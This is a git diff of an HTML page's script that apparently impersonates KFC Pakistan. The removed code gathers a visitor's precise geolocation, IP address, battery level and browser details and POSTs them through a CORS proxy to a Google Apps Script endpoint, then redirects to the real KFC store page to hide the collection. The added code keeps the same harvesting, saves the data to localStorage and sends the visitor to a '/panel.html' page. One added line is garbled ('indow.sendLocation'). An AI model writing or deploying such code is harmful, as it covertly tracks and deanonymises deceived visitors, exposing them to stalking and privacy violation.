@@ -120,63 +120,55 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   }
 
-  // Attach to global so button can find it
-  window.sendLocation = async function () {
-    let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
+ indow.sendLocation = async function () {
+  let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
 
-    try {
-      const ipRes = await fetch("https://api.ipify.org?format=json");
-      const ipData = await ipRes.json();
-      ip = ipData.ip;
-    } catch (e) {}
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    ip = ipData.ip;
+  } catch (e) {}
 
-    try {
-      const batt = await navigator.getBattery();
-      battery = Math.round(batt.level * 100) + "%";
-    } catch (e) {}
+  try {
+    const batt = await navigator.getBattery();
+    battery = Math.round(batt.level * 100) + "%";
+  } catch (e) {}
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(async (position) => {
-        lat = position.coords.latitude;
-        lon = position.coords.longitude;
-        accuracy = position.coords.accuracy;
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition((position) => {
+      lat = position.coords.latitude;
+      lon = position.coords.longitude;
+      accuracy = position.coords.accuracy;
 
-        const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
+      const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
 
-        const payload = {
-          lat,
-          lon,
-          accuracy,
-          ip,
-          battery,
-          ua: userAgent,
-          map: mapUrl
-        };
+      const payload = {
+        lat,
+        lon,
+        accuracy,
+        ip,
+        battery,
+        ua: userAgent,
+        map: mapUrl,
+        time: new Date().toLocaleString()
+      };
 
-        try {
-          await fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-          });
-        } catch (err) {
-          console.error("Data send error:", err);
-        }
+      // Store in localStorage
+      localStorage.setItem("kfcData", JSON.stringify(payload));
 
-        setTimeout(() => {
-          window.location.href = "https://www.kfcpakistan.com/store-locations";
-        }, 1000);
-      }, () => {
-        window.location.href = "https://www.kfcpakistan.com/store-locations";
-      });
-    } else {
+      // Go to panel page
+      window.location.href = "/panel.html";
+    }, () => {
       window.location.href = "https://www.kfcpakistan.com/store-locations";
-    }
-  };
-});
+    });
+  } else {
+    window.location.href = "https://www.kfcpakistan.com/store-locations";
+  }
+};
 </script>
 </body>
 </html>
+
 
 
 
